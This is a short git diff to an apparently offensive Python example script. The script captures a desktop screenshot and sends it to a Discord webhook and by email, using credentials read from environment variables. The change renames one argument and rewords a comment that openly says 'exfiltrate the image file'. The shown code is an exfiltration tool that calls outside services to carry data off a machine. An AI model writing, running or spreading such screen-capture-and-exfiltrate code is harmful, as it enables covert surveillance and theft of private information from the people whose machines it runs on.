@@ -28,7 +28,7 @@ dotenv.load_dotenv()
 
 # Set up the ScreenShot module to save the file to a pre-determined path
 screenshot_file = pathlib.Path.home().joinpath("Desktop/sample_screenshot.png")
-screenshot = ScreenShot(file_path=screenshot_file)
+screenshot = ScreenShot(image_path=screenshot_file)
 
 # The image will be sent to a Discord server through a Webhook URL
 Discord(module=screenshot,
@@ -41,5 +41,5 @@ Email(module=screenshot,
       email=os.getenv("EMAIL_USERNAME"),
       password=os.getenv("EMAIL_PASSWORD"))
 
-# Done. The screenshot and proceed to exfiltration of the image file.
+# Done. Take the screenshot and exfiltrate the image file.
 screenshot.execute()
